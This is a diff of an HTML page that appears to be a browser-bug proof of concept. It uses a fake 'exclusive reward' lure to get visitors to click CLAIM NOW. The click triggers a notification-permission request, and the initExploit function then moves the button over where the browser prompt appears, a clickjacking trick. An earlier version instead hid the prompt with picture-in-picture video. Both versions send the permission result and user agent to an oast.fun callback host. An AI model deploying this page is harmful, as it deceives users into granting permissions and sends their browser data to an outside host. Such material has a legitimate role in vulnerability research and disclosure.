@@ -1,55 +1,47 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Claim Your Free Gift!</title>
+  <title>🎁 Exclusive Bonus 🎁</title>
   <style>
-    body { text-align: center; font-family: sans-serif; }
-    .fake-video { width: 400px; height: 300px; background: black; margin-top: 50px; position: relative; }
-    .claim-btn {
-      position: absolute;
-      top: 120px; left: 100px;
+    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+    #claimBtn {
+      background: orange;
+      color: black;
       padding: 15px 30px;
-      background: yellow; border: none;
-      font-size: 16px;
+      font-size: 20px;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      z-index: 9999;
+      position: relative;
+      z-index: 10000;
     }
   </style>
 </head>
 <body>
-  <h1>🎁 Watch & Claim Your Bonus!</h1>
-  <p>Watch this short video and claim your reward.</p>
-
-  <div class="fake-video">
-    <video id="baitVideo" width="400" height="300" autoplay muted playsinline>
-      <source src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4" type="video/mp4">
-    </video>
-    <button class="claim-btn" onclick="trigger()">CLAIM NOW</button>
-  </div>
+  <h1>🎉 Congratulations! 🎉</h1>
+  <p>You’ve been selected for an exclusive reward.</p>
+  <button id="claimBtn" onclick="initExploit()">CLAIM NOW</button>
 
   <script>
-    async function trigger() {
-      // Request permission under deception
-      try {
-        Notification.requestPermission().then(result => {
-          fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/notify-deception', {
-            method: 'POST',
-            body: JSON.stringify({ permission: result, ua: navigator.userAgent }),
-            headers: { 'Content-Type': 'application/json' }
-          });
+    async function initExploit() {
+      const btn = document.getElementById('claimBtn');
+
+      // Step 1: Trigger Notification prompt (appears at top by default)
+      Notification.requestPermission().then(result => {
+        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/notif-cloak', {
+          method: 'POST',
+          body: JSON.stringify({ result, ua: navigator.userAgent }),
+          headers: { 'Content-Type': 'application/json' }
         });
-      } catch (e) {}
+      });
 
-      // Force PiP to obscure
-      const video = document.getElementById('baitVideo');
-      if (document.pictureInPictureEnabled) {
-        await video.requestPictureInPicture();
-      }
-
-      // Optional redirect to cloak intent
+      // Step 2: Delay a moment and move button over notification area
       setTimeout(() => {
-        location.href = 'https://www.google.com/search?q=thank+you+for+claiming';
-      }, 2500);
+        btn.style.position = 'fixed';
+        btn.style.top = '60px';  // roughly where browser shows prompt
+        btn.style.left = '50%';
+        btn.style.transform = 'translateX(-50%)';
+      }, 300); // short delay to align with prompt
     }
   </script>
 </body>
